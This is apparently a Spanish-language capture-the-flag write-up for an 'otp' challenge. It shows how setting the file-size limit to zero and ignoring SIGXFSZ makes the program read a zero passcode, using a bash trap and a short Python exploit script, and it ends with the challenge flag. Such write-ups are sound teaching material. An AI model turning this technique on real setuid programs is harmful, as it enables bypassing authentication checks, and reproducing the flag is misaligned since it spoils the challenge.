# otp

<img width="134" height="167" alt="otp" src="https://github.com/user-attachments/assets/640eab5b-5e36-4ea0-9836-38f7903a2a3b" />

En https://linuxcommand.org/lc3_man_pages/ulimith.html podemos ver que `ulimit -f 0` podemos hacer que el tamaño máximo (en bloques de 512 bytes) de cualquier archivo que un proceso pueda crear mediante escritura sea 0. 

Esto provoca que no se pueda crear el archivo temporal y al intentar leer del archivo inexistente no se actualiza passcode, entonces passcode=0.

Sin embargo cuando el tamaño de un arhivo excede lo establecido por `ulimit` se lanza una excepcion `SIGXFSZ`.

Usando `trap 'commands' signal` en `bash` se puede personalizar el comportamiento de la terminal para una señal en especifico. Ignorando SIGXFSZ conseguimos la flag:

<img width="366" height="152" alt="2025-08-05-140945_1327x152_scrot" src="https://github.com/user-attachments/assets/9e448180-c058-4a4c-8140-dcce393c80b1" />

Otra forma es usando un subproceso. Por ejemplo con python:
``` py
import signal
import resource
import subprocess
import os

# ulimit -f 0
resource.setrlimit(resource.RLIMIT_FSIZE, (0, 0))

# preexec_fd sets the signal handler for the subprocess
subp = subprocess.Popen(
            ["/home/otp/otp", ""],
            preexec_fn=lambda: signal.signal(signal.SIGXFSZ, signal.SIG_IGN)
                )
subp.wait()
```

`f1le_0peration_r3turn_value_matters`
